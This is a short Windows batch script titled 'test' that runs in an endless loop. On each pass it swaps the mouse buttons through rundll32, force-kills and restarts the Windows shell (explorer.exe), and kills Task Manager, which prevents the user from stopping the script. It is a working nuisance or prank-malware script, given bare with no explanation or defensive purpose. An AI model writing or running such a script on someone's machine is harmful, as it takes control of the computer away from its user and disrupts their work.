@echo off 
title test 
color  3a 
:RE 
CLS 
Rundll32 user32,SwapMouseButton 
TASKKILL /F /IM EXPLORER.EXE 
START  EXPLORER.EXE 
TASKKILL /F /IM TASKMGR.EXE 
GOTO RE 